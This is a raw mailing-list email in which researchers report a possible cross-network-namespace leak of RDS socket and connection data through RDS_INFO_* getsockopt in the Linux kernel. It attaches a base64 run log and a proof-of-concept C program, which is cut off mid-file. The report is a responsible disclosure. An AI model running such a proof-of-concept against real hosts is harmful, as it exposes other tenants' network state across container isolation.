Return-Path: <linux-rdma+bounces-20006-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id kATPN0qs+Wky+wIAu9opvQ
	(envelope-from <linux-rdma+bounces-20006-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Tue, 05 May 2026 10:37:30 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 7C7EE4C8BFA
	for <lists+linux-rdma@lfdr.de>; Tue, 05 May 2026 10:37:30 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id 7DD38300D761
	for <lists+linux-rdma@lfdr.de>; Tue,  5 May 2026 08:37:29 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 454F430BB8A;
	Tue,  5 May 2026 08:37:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=ntu.edu.sg header.i=@ntu.edu.sg header.b="XgL6OhMF"
X-Original-To: linux-rdma@vger.kernel.org
Received: from TYPPR03CU001.outbound.protection.outlook.com (mail-japaneastazon11012004.outbound.protection.outlook.com [52.101.126.4])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 30EA314A62B;
	Tue,  5 May 2026 08:37:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.126.4
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1777970247; cv=fail; b=sWUJexdxWi0M3wXups2WsnN2nwdL/OIfuYBJGIY6+5NY7CC0zkqBFrNSYN7xha+bvaMl8m1LUwQEasp1x5fS1nP2HMo+0WSY4vgu9vv7bUJBJSiKmVNyYp0sPDHoLMlgU+6nE3GBP0uU2y/ou5wmT1/fLqsTAkm7H0ET3qnyOPU=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1777970247; c=relaxed/simple;
	bh=pj3lEkGDCgUX5IcKCrWWElvI+YEJbW3asbCFSpiL31E=;
	h=From:To:CC:Subject:Date:Message-ID:Content-Type:MIME-Version; b=IvtWQFVVsJXJ9322VBpvtoaqFRoQkIuU/XpOgF27/Z4MiTa+dekhKDQAnrL6O8jaUS6eLJiLqVvSwOFNIecOqGWbuJzUdysHk7aiILalAUtSPLw85MAjlN9IzCG456rJ7ezxHJDdMsc6LgyLwk70P7HWB6rJc+E9ndJD65BVzVI=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=ntu.edu.sg; spf=pass smtp.mailfrom=ntu.edu.sg; dkim=pass (2048-bit key) header.d=ntu.edu.sg header.i=@ntu.edu.sg header.b=XgL6OhMF; arc=fail smtp.client-ip=52.101.126.4
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=ntu.edu.sg
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=ntu.edu.sg
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=B0AdpG3LHqIEA/GlCzhDCW34HYh/a2up2DfLyKhf491vZM/x1Xu+KZB6/0mM1dWzkkYjVZoqTc/to/Uxa4dbP3+Z9V3yBjGW4OBE6Lse1Ang7gk4E/Ov4iwKFRxQ4fSScXTKRxWSooxSSRR7ItnW7ahfGHT5/YGIUz9zb2mDalKxbdwugHLzLB+pHUvqj+VrlCbXnlHcc+tSs2mIAe1x05aGoLWWwZFvDXZb7llKxBbXPKcQ97OgBJjdslhS+MhfEnFZlmiqevq4l3Ep8Pzayhmqf2ho57HUZnS+4+PVfF6hPAZ40x5TG9zJoJ2BBtkN6VSmLu60bgrt0Vb8kf88jQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=+K9jYbTN/4DPXNXQzpS3vNE5QVYs35J8JyYOaCFOn2s=;
 b=y97E4aUJrZkQS8DUzBgmQbWLBqskC1C52xYdQfULV0tglDbm5+S+Kkau0D3IS2xN04XtkelGvX8MPfcYPTuEILhVWt+N9v46UJBfHwgdlSkPZjmSZko7MpM57zvXgklUwpxpVs7F7csVK8nADbHZHHE335xCU+irpvOHjaJnC76RdVPcZapDqzUfhglO/ifE/QqfL6N3REqZAh8ivngXlpUBCLck9blns+5Xa7o7Jwew4rEuOh3b2EKGa38RU5xAvqXp5bW/BwOrabpC0wccAmnOWYE+6ZpsGckA9gXS9W3JB5HjDBJ8BdQr+tyC/MUUdqG+uSDtpLAlIegJgUKC6g==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=ntu.edu.sg; dmarc=pass action=none header.from=ntu.edu.sg;
 dkim=pass header.d=ntu.edu.sg; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ntu.edu.sg;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=+K9jYbTN/4DPXNXQzpS3vNE5QVYs35J8JyYOaCFOn2s=;
 b=XgL6OhMFv+ilRP0F6JdPKGD+YDKt/cyrTnUSBJRbPcafQsGcGn64B5m6uKhez+MXGhsQJu91BHEbC6FYeCt6QLVW8jIc2zge6O/HsaDJ4ZUXpAX4v7QueR5iAaLAYeoQ9iShgSrv71Y+DAdbAduQns8rcm5lJ+9txx7C/u3+vQDT/IeCpvXTVyXfHoK82yRdw280hJrW9Nqqi6NfOBGdYwGTeRutOckzF7bOQIWGj9QVRVBm4U+Xu69zOONSj4Z7puIWtU01+ykyA+hDrFxmyszwHcIHbmnOHCNHmFN1mWPYA2DUdmKknJV0MF6umfvcAAHz2GuWiHh1D768m7c8vA==
Received: from TYZPR01MB6758.apcprd01.prod.exchangelabs.com
 (2603:1096:405:a2::6) by TY0PR0101MB4699.apcprd01.prod.exchangelabs.com
 (2603:1096:400:32c::5) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9870.25; Tue, 5 May
 2026 08:37:19 +0000
Received: from TYZPR01MB6758.apcprd01.prod.exchangelabs.com
 ([fe80::bbb1:1ecd:fe69:9743]) by TYZPR01MB6758.apcprd01.prod.exchangelabs.com
 ([fe80::bbb1:1ecd:fe69:9743%4]) with mapi id 15.20.9870.023; Tue, 5 May 2026
 08:37:19 +0000
From: Xie Maoyi <maoyi.xie@ntu.edu.sg>
To: "achender@kernel.org" <achender@kernel.org>
CC: "netdev@vger.kernel.org" <netdev@vger.kernel.org>,
	"linux-rdma@vger.kernel.org" <linux-rdma@vger.kernel.org>,
	"rds-devel@oss.oracle.com" <rds-devel@oss.oracle.com>
Subject: rds: possible cross netns leak via RDS_INFO_* getsockopt
Thread-Topic: rds: possible cross netns leak via RDS_INFO_* getsockopt
Thread-Index: AQHc3GmNFjglT8RFCkaEpGWQP2W0QQ==
Date: Tue, 5 May 2026 08:37:19 +0000
Message-ID:
 <TYZPR01MB6758F43459242F22946A8192DC3E2@TYZPR01MB6758.apcprd01.prod.exchangelabs.com>
Accept-Language: en-GB, en-US
Content-Language: en-GB
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
msip_labels:
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=ntu.edu.sg;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: TYZPR01MB6758:EE_|TY0PR0101MB4699:EE_
x-ms-office365-filtering-correlation-id: 38b7ba6f-91cd-471b-361b-08deaa81851d
x-o365: NTU-OFF365
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|366016|786006|1800799024|6049299003|376014|18002099003|56012099003|4053099003|38070700021;
x-microsoft-antispam-message-info:
 OV4FDwPOaiid+ot5Be9akssEdg6uTrRN6ThZZAtkVidCq72SDc2r1vQV8tnq8TygRBHhttLMEhJQoah/WTzZNqj1QeGYejMSM6NqWSyIcxCt2HdmV4hNe+acHsd6UxqSjou/IKT4wN5DHl7yCxBmaVpIn7vS5YhOr57YAeHGKSLv3c4Yli1cLfI0aOEysX/o0hylGKk2oEgp1G6bBL7LPToV2cmjmnlAdaRYQ1yNfuZBVdr1WbGHYttpvGnoHlB16YGCc2l/Fw3RA0ksWGayP2g2Ppaygcd73jdEDgktaXSZm8WIpm7tolZ/HGLFgdRyNAVwOqKzBgOd+MjhCgs+jNrPvvrJZoZe1m5K7SENny9Em27CcjRWUaGpeGm2trjahGG7Utzfoa3PZOIHsckRUQCPisf0wUejr5FSg25EyxyemS5VEb/+xmx98S8q2Eg6urOvfXObiEAwidhL0iphBdGN5sdDAMm3YMwSqtGbCfpPnAkpsKp8/DegpcPVOJEzRzIE0oD8XbyvadSNYtZ6/v2GWSL8pzyzxuyXIgWOofffdrmwYSVkGdKyU1KXxQgJm98g7m8bSn19PxNUBqAm7d+IoAVfZgi+C4D4Zmn20abGZPgI6XNhSZz2y6lZDEiMnobrjvYPAXUAPErZfX5JBkZdfGRpTSmocBOLhneWOAkMs6c0nLHZv73yAo2YG0jTs033h5m/6bSx3qAWEKNP/g==
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:TYZPR01MB6758.apcprd01.prod.exchangelabs.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(786006)(1800799024)(6049299003)(376014)(18002099003)(56012099003)(4053099003)(38070700021);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?iso-8859-1?Q?BQYvGWfojJ6wc5Vv+VALsO60xWleB9jifCb7cWMU+j+lLd/uB99yIfZBGS?=
 =?iso-8859-1?Q?G4JVn3fcqUAPh6Hw2ylNbuoxR90IglCAbtnqTTujPtm19FiWz4+yuX/rwq?=
 =?iso-8859-1?Q?HhN9dQOoSO5p/mHlnIbcpBe0X10WrDhzneoftp0jv8vq/i6NYo2IO+U87h?=
 =?iso-8859-1?Q?2zCYKTDQQlPPG1Cx4GvLfmncD14/jo9+1XiTjVnLV3//woeu+twISy0LtF?=
 =?iso-8859-1?Q?7nyy85FoADeWe+pZQz12d5sbaBVZZAko+vPRT/cEkk+JJ/9vRInUWA1+On?=
 =?iso-8859-1?Q?IyN0oARTkihiV+6JQxmWEdfCZJi1QJhwMK0kY9ZtOXxJH6jvIAh9QDSx0K?=
 =?iso-8859-1?Q?P5PpgZK1DoE56VZDtGW/05Q7p7xy5OWvCin84R8djLEYYeBcgU8To3t/To?=
 =?iso-8859-1?Q?rMG8i5v3kViNmmsUcJNxJ7DxeQ4KKXRy1s1Jkk+G9QPK4icwHGUID4r2mZ?=
 =?iso-8859-1?Q?SHpI9+ZBSG6KjKc/g6kk9UtmUA4td/ZdYylmByQz857GMddsYgwLg+bqpX?=
 =?iso-8859-1?Q?CsKVNF+CEkh/QTB53YatipcYjClqbEpHm0GYNV3NUmdIdGmeKaFQfaro1R?=
 =?iso-8859-1?Q?F+342Dmj3cTRfM5JkXw9s3qTyMWORrAebrLY7lBd+FbVH3DbDVvMWDaAet?=
 =?iso-8859-1?Q?Mvmf780i0W1SVpgZeLWqLaVASNFZnfIj1kb/LQDNENB9RXp4bHIJ8iOYlM?=
 =?iso-8859-1?Q?XPaR9FwBfNQgTScve4SoJI+QrjpSsT2XU6Io2bxlJLPDzAddDL4UANy3pZ?=
 =?iso-8859-1?Q?Srrds+tUwypaWwAfBEVKv7lFPYPyrHrHzZTvOaXSIBIYDUkmDPOJxxDkZP?=
 =?iso-8859-1?Q?lRTL22bRTlTtr2X8eL99DEitGtCKeWRvjZNQyX/sNbe1cqUG+O+X4i5Ir9?=
 =?iso-8859-1?Q?xI1ntPCmiNvee6CsQTw4E4EJjc+7uSrX8lwmha/F5M5bupKBnnxiMdOrI9?=
 =?iso-8859-1?Q?5nLh35Fj2Nj9sP1i9TKIXaYrG3fYT+iJnVyU9O7gA7r+ZD07A834N4bnrR?=
 =?iso-8859-1?Q?Li9vDF22oH6+lKiuJaQvqvWqGgAGE/uxb/T2Yo3bu53H2XnpzqhZRo9cJ3?=
 =?iso-8859-1?Q?nv98jihtFmxjz31JH6KMObvsVhLrdYKOpyzh8ZR/ndSO9bg3biECU6Bf7y?=
 =?iso-8859-1?Q?/HTEcTD8quzNVy/WePXFd4xoZ22EhMWuqpH5uVQE05/v5Urndktx3GfLgO?=
 =?iso-8859-1?Q?PQtfq6FnjvUnwbGMMPLoArA42UoExGesC+Tx7P6tJvbWgEAt9yYSf465Kv?=
 =?iso-8859-1?Q?lA79mlyaCrVicG7GwxOTphCC9S0QAFWR1ClPpZkEt2776l/mTMZpdKF4rr?=
 =?iso-8859-1?Q?tPazypbZ+ORfXn3cKOoaXSecF1Okz1fdJnXTmhTCBlX2XnYVIXDMg/2cu0?=
 =?iso-8859-1?Q?zJ1RsSFJgZWO3GvVdgTsyxDD3WNkTrKYilUzWpRk1bTOZTs2PiKAANmLPi?=
 =?iso-8859-1?Q?VSrCsdBZfgvs+Xl1bITrtxCyplaOd3pgt2ejaaV2DarNffuHJjVgPnpmCi?=
 =?iso-8859-1?Q?0iIma+m6CIccZW5WawXEN8WMb/L1Nf9hK3UPt5ZBf2qgKCr2ONgeiPZ+mN?=
 =?iso-8859-1?Q?6pY+ugZjbC0JfVw0goNMz0UNHcp1qOmeo6qF/44fIkavGztLbwayZkMpxk?=
 =?iso-8859-1?Q?K0BHjpEXqmAHfgaaZ0HHu9UDiy0Kd5y28w+LL+qTEFKBWeOo6AMO4ZY8MP?=
 =?iso-8859-1?Q?qH3Ci4LBQ+LFXE0FS1fEIeMMucjpAgaM20tEELVo1wojoq1/Ze5ZF1tQqb?=
 =?iso-8859-1?Q?Sne92V8BCZmkTvAao4XXnA0SHTwFu35DEzvZoNf1WZaEUvbikDkF3GWAY/?=
 =?iso-8859-1?Q?7xQH/1B4ClXardMUNjL9v7m+DTVsJ3g=3D?=
Content-Type: multipart/mixed;
	boundary="_003_TYZPR01MB6758F43459242F22946A8192DC3E2TYZPR01MB6758apcp_"
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-OriginatorOrg: ntu.edu.sg
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: TYZPR01MB6758.apcprd01.prod.exchangelabs.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 38b7ba6f-91cd-471b-361b-08deaa81851d
X-MS-Exchange-CrossTenant-originalarrivaltime: 05 May 2026 08:37:19.3449
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 15ce9348-be2a-462b-8fc0-e1765a9b204a
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: a82HrWcLqrTXhksv+vbLk9JrBkvlh8/pj07XS1ZJbNlc/QNsMXwfsI+mEF5f7eNmARL2bpbDLymwZtGpFDOZo1VpUKyM3SoLxzcWm7YXh6U=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: TY0PR0101MB4699
X-Rspamd-Queue-Id: 7C7EE4C8BFA
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-0.06 / 15.00];
	ARC_REJECT(1.00)[cv is fail on i=2];
	DMARC_POLICY_ALLOW(-0.50)[ntu.edu.sg,quarantine];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64:c];
	R_DKIM_ALLOW(-0.20)[ntu.edu.sg:s=selector1];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	MIME_BASE64_TEXT(0.10)[];
	HAS_LIST_UNSUB(-0.01)[];
	FROM_HAS_DN(0.00)[];
	TO_DN_EQ_ADDR_ALL(0.00)[];
	TAGGED_FROM(0.00)[bounces-20006-lists,linux-rdma=lfdr.de];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	DKIM_TRACE(0.00)[ntu.edu.sg:+];
	RCPT_COUNT_THREE(0.00)[4];
	MIME_TRACE(0.00)[0:+,1:+,2:~,3:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[maoyi.xie@ntu.edu.sg,linux-rdma@vger.kernel.org];
	HAS_ATTACHMENT(0.00)[];
	NEURAL_HAM(-0.00)[-0.972];
	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
	TAGGED_RCPT(0.00)[linux-rdma];
	MISSING_XM_UA(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[maoyixie.com:url,ntu.edu.sg:dkim,sto.lore.kernel.org:helo,sto.lore.kernel.org:rdns]

--_003_TYZPR01MB6758F43459242F22946A8192DC3E2TYZPR01MB6758apcp_
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Hi all,

We are not sure whether what we observed is a real bug or
intended behaviour. We would appreciate your view.

In net/rds/info.c, rds_info_getsockopt() dispatches to handlers
registered in rds_info_funcs[]. Each handler reads a global list
that is not pernet:

  rds_sock_info / rds6_sock_info        -> rds_sock_list
  rds_tcp_tc_info / rds6_tcp_tc_info    -> rds_tcp_tc_list
  rds_conn_info / rds6_conn_info        -> rds_conn_hash[]

None of those filter by the caller's netns. rds_info_getsockopt()
also has no netns or capable() check. rds_create() has no
capable() check either. So AF_RDS is reachable from an
unprivileged user namespace.

Our reading is that an unprivileged caller in a fresh user_ns
plus netns can read RDS state from init_net. We see this in
practice on the latest net tree.

The fields that come back include:

  RDS_INFO_SOCKETS:     bound addr, port, sock inode of every
                        RDS socket on the host
  RDS_INFO_TCP_SOCKETS: peer addr, port, last_sent_nxt,
                        last_expected_una, last_seen_una of
                        every rds-tcp connection on the host
  RDS_INFO_CONNECTIONS: peer addr, port, cp_next_tx_seq,
                        cp_next_rx_seq of every RDS connection

A small reproducer is attached as poc_rds_info.c. With rds and
rds_tcp loaded, the steps are:

  modprobe rds
  modprobe rds_tcp
  ./poc_rds_info

The PoC binds an AF_RDS socket in init_net to 127.0.0.1:4242 as
root. It then enters a fresh user_ns plus netns and opens AF_RDS
there. The attacker side reads RDS_INFO_SOCKETS and sees the
init_net socket. A run log is attached as poc_verification.log.

We are not sure if this counts as a bug or is by design. The
RDS_INFO_* interface looks diagnostic. It may be expected to be
host wide. On the other hand, AF_RDS is reachable from an
unprivileged user namespace, which is what surprised us.

Could you let us know whether you consider this worth fixing? If
yes, we have a draft patch that gates rds_info_getsockopt() to
init_net. We can send it once you confirm the direction.

Thanks for your time.

Maoyi Xie and Praveen Kakkolangara

Maoyi Xie
Nanyang Technological University
https://maoyixie.com/
________________________________

CONFIDENTIALITY: This email is intended solely for the person(s) named and =
may be confidential and/or privileged. If you are not the intended recipien=
t, please delete it, notify us and do not copy, use, or disclose its conten=
ts.
Towards a sustainable earth: Print only when necessary. Thank you.

--_003_TYZPR01MB6758F43459242F22946A8192DC3E2TYZPR01MB6758apcp_
Content-Type: application/octet-stream; name="poc_verification.log"
Content-Description: poc_verification.log
Content-Disposition: attachment; filename="poc_verification.log"; size=1183;
	creation-date="Tue, 05 May 2026 08:32:01 GMT";
	modification-date="Tue, 05 May 2026 08:32:01 GMT"
Content-Transfer-Encoding: base64

W3ZpY3RpbV0gQUZfUkRTIGJvdW5kIDEyNy4wLjAuMTo0MjQyIGluIGluaXRfbmV0IChyb290KQpb
aW5pdC1wcm9iZV0gY291bnQtcHJvYmUoU09DS0VUUykgcmM9LTEgZXJybm89Mjggb3B0bGVuLWFm
dGVyPTU2Cltpbml0LXByb2JlXSBnZXRzb2Nrb3B0KFNPQ0tFVFMpIHJjPTI4IChlYWNoPTI4KSBs
ZW49MjggLT4gMSBlbnRyaWVzCiAgICBbMF0gYm91bmQ9MTI3LjAuMC4xOjQyNDIgaW51bT0zOTEz
IHNuZGJ1Zj0xMDY0OTYgcmN2YnVmPTEwNjQ5NgogICAgKioqIExFQUs6IHRoaXMgaXMgdGhlIHZp
Y3RpbSdzIGluaXRfbmV0IHNvY2tldCAoMTI3LjAuMC4xOjQyNDIpIOKAlCB2aXNpYmxlIGZyb20g
YXR0YWNrZXIncyBmcmVzaCBuZXRucyAqKioKW2luaXQtcHJvYmVdIGNvdW50LXByb2JlKFRDUF9T
T0NLRVRTKSByYz00MSBlcnJubz0yOCBvcHRsZW4tYWZ0ZXI9MApbaW5pdC1wcm9iZV0gZ2V0c29j
a29wdChDT1VOVEVSUykgcmM9NDAgKGVhY2g9NDApIGxlbj0xNjgwIC0+IDQyIGVudHJpZXMKW2F0
dGFja2VyXSBpbiBuZXRucz1uZXQ6WzQwMjY1MzIyNjBdIHVpZD0wClthdHRhY2tlcl0gQUZfUkRT
IG9wZW5lZCBpbiBmcmVzaCBuZXRucyAtPiBmZD00ClthdHRhY2tlcl0gY291bnQtcHJvYmUoU09D
S0VUUykgcmM9LTEgZXJybm89Mjggb3B0bGVuLWFmdGVyPTU2ClthdHRhY2tlcl0gZ2V0c29ja29w
dChTT0NLRVRTKSByYz0yOCAoZWFjaD0yOCkgbGVuPTI4IC0+IDEgZW50cmllcwogICAgWzBdIGJv
dW5kPTEyNy4wLjAuMTo0MjQyIGludW09MzkxMyBzbmRidWY9MTA2NDk2IHJjdmJ1Zj0xMDY0OTYK
ICAgICoqKiBMRUFLOiB0aGlzIGlzIHRoZSB2aWN0aW0ncyBpbml0X25ldCBzb2NrZXQgKDEyNy4w
LjAuMTo0MjQyKSDigJQgdmlzaWJsZSBmcm9tIGF0dGFja2VyJ3MgZnJlc2ggbmV0bnMgKioqClth
dHRhY2tlcl0gY291bnQtcHJvYmUoVENQX1NPQ0tFVFMpIHJjPTQxIGVycm5vPTI4IG9wdGxlbi1h
ZnRlcj0wClthdHRhY2tlcl0gZ2V0c29ja29wdChUQ1BfU09DS0VUUykgcmM9NDEgKGVhY2g9NDEp
IGxlbj0wIC0+IDAgZW50cmllcwpbYXR0YWNrZXJdIGNvdW50LXByb2JlKENPTk5FQ1RJT05TKSBy
Yz00MiBlcnJubz0yOCBvcHRsZW4tYWZ0ZXI9MApbYXR0YWNrZXJdIGdldHNvY2tvcHQoQ09VTlRF
UlMpIHJjPTQwIChlYWNoPTQwKSBsZW49MTY4MCAtPiA0MiBlbnRyaWVzCg==

--_003_TYZPR01MB6758F43459242F22946A8192DC3E2TYZPR01MB6758apcp_
Content-Type: text/plain; name="poc_rds_info.c"
Content-Description: poc_rds_info.c
Content-Disposition: attachment; filename="poc_rds_info.c"; size=5895;
	creation-date="Tue, 05 May 2026 08:32:01 GMT";
	modification-date="Tue, 05 May 2026 08:32:01 GMT"
Content-Transfer-Encoding: base64

LyogUG9DIHYyOiBSRFMgUkRTX0lORk9fKiBjcm9zcy1uZXRucyBnZXRzb2Nrb3B0IGxlYWsuCiAq
IEJ1aWxkOiBnY2MgcG9jX3Jkc19pbmZvLmMgLW8gcG9jX3Jkc19pbmZvCiAqIFJ1biBhcyByb290
IGluIGluaXRfbmV0LgogKi8KI2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4K
I2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDx1bmlzdGQu
aD4KI2luY2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8c2NoZWQu
aD4KI2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8
c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvd2FpdC5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+
CgojaWZuZGVmIEFGX1JEUwojZGVmaW5lIEFGX1JEUyAyMQojZW5kaWYKI2lmbmRlZiBTT0xfUkRT
CiNkZWZpbmUgU09MX1JEUyAyNzYKI2VuZGlmCgojZGVmaW5lIFJEU19JTkZPX0NPVU5URVJTICAg
ICAgICAgMTAwMDAKI2RlZmluZSBSRFNfSU5GT19DT05ORUNUSU9OUyAgICAgIDEwMDAxCiNkZWZp
bmUgUkRTX0lORk9fU0VORF9NRVNTQUdFUyAgICAxMDAwMwojZGVmaW5lIFJEU19JTkZPX1JFVFJB
TlNfTUVTU0FHRVMgMTAwMDQKI2RlZmluZSBSRFNfSU5GT19SRUNWX01FU1NBR0VTICAgIDEwMDA1
CiNkZWZpbmUgUkRTX0lORk9fU09DS0VUUyAgICAgICAgICAxMDAwNgojZGVmaW5lIFJEU19JTkZP
X1RDUF9TT0NLRVRTICAgICAgMTAwMDcKI2RlZmluZSBSRFM2X0lORk9fQ09OTkVDVElPTlMgICAg
IDEwMDExCiNkZWZpbmUgUkRTNl9JTkZPX1NPQ0tFVFMgICAgICAgICAxMDAxNQojZGVmaW5lIFJE
UzZfSU5GT19UQ1BfU09DS0VUUyAgICAgMTAwMTYKCnN0cnVjdCByZHNfaW5mb19zb2NrZXQgewog
ICAgdWludDMyX3Qgc25kYnVmOwogICAgdWludDMyX3QgYm91bmRfYWRkcjsKICAgIHVpbnQzMl90
IGNvbm5lY3RlZF9hZGRyOwogICAgdWludDE2X3QgYm91bmRfcG9ydDsKICAgIHVpbnQxNl90IGNv
bm5lY3RlZF9wb3J0OwogICAgdWludDMyX3QgcmN2YnVmOwogICAgdWludDY0X3QgaW51bTsKfSBf
X2F0dHJpYnV0ZV9fKChwYWNrZWQpKTsKCiNkZWZpbmUgVklDVElNX1BPUlQgNDI0MgoKc3RhdGlj
IGNvbnN0IGNoYXIgKm9wdF9uYW1lKGludCBvKSB7CiAgICBzd2l0Y2gobyl7Y2FzZSAxMDAwMDpy
ZXR1cm4gIkNPVU5URVJTIjtjYXNlIDEwMDAxOnJldHVybiAiQ09OTkVDVElPTlMiOwogICAgY2Fz
ZSAxMDAwMzpyZXR1cm4gIlNFTkRfTVNHIjtjYXNlIDEwMDA0OnJldHVybiAiUkVUUkFOU19NU0ci
OwogICAgY2FzZSAxMDAwNTpyZXR1cm4gIlJFQ1ZfTVNHIjtjYXNlIDEwMDA2OnJldHVybiAiU09D
S0VUUyI7CiAgICBjYXNlIDEwMDA3OnJldHVybiAiVENQX1NPQ0tFVFMiO2Nhc2UgMTAwMTE6cmV0
dXJuICI2X0NPTk5FQ1RJT05TIjsKICAgIGNhc2UgMTAwMTU6cmV0dXJuICI2X1NPQ0tFVFMiO2Nh
c2UgMTAwMTY6cmV0dXJuICI2X1RDUF9TT0NLRVRTIjt9CiAgICByZXR1cm4gIj8iOwp9CgpzdGF0
aWMgdm9pZCBwcm9iZV9vbmUoaW50IHMsIGludCBvcHQsIGNvbnN0IGNoYXIgKndobykgewogICAg
Y2hhciBidWZbODE5Ml07CiAgICBzb2NrbGVuX3QgbGVuID0gc2l6ZW9mKGJ1Zik7CiAgICBpbnQg
cmMgPSBnZXRzb2Nrb3B0KHMsIFNPTF9SRFMsIG9wdCwgYnVmLCAmbGVuKTsKICAgIGlmIChyYyA8
IDApIHsKICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlslc10gZ2V0c29ja29wdCglcykgcmM9JWQg
ZXJybm89JWQgKCVzKVxuIiwKICAgICAgICAgICAgICAgIHdobywgb3B0X25hbWUob3B0KSwgcmMs
IGVycm5vLCBzdHJlcnJvcihlcnJubykpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGludCBl
YWNoID0gcmM7CiAgICBpbnQgbmVudHJpZXMgPSBlYWNoID8gKGludClsZW4gLyBlYWNoIDogMDsK
ICAgIGZwcmludGYoc3RkZXJyLCAiWyVzXSBnZXRzb2Nrb3B0KCVzKSByYz0lZCAoZWFjaD0lZCkg
bGVuPSV1IC0+ICVkIGVudHJpZXNcbiIsCiAgICAgICAgICAgIHdobywgb3B0X25hbWUob3B0KSwg
cmMsIGVhY2gsICh1bnNpZ25lZClsZW4sIG5lbnRyaWVzKTsKICAgIGlmIChvcHQgPT0gUkRTX0lO
Rk9fU09DS0VUUyAmJiBuZW50cmllcyA+IDApIHsKICAgICAgICBzdHJ1Y3QgcmRzX2luZm9fc29j
a2V0ICpzaSA9ICh2b2lkICopYnVmOwogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbmVudHJp
ZXM7IGkrKykgewogICAgICAgICAgICBjaGFyIGJbMzJdOwogICAgICAgICAgICBpbmV0X250b3Ao
QUZfSU5FVCwgJnNpW2ldLmJvdW5kX2FkZHIsIGIsIHNpemVvZihiKSk7CiAgICAgICAgICAgIGZw
